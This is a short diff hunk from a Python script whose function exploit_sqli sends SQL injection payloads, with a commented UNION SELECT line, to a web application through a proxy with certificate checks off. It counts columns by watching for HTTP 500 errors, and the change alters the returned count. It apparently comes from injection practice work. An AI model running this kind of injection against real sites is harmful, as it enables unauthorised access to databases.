@@ -14,7 +14,7 @@ def exploit_sqli(url, uri, payload):
         # payload1 = f"' UNION SELECT {columns}--"
         res = requests.get(url+uri+payload, proxies=proxies, verify=False)
         if res.status_code == 500 :
-            result = i-1
+            result = i
         # columns += ',NULL'
         
     return result
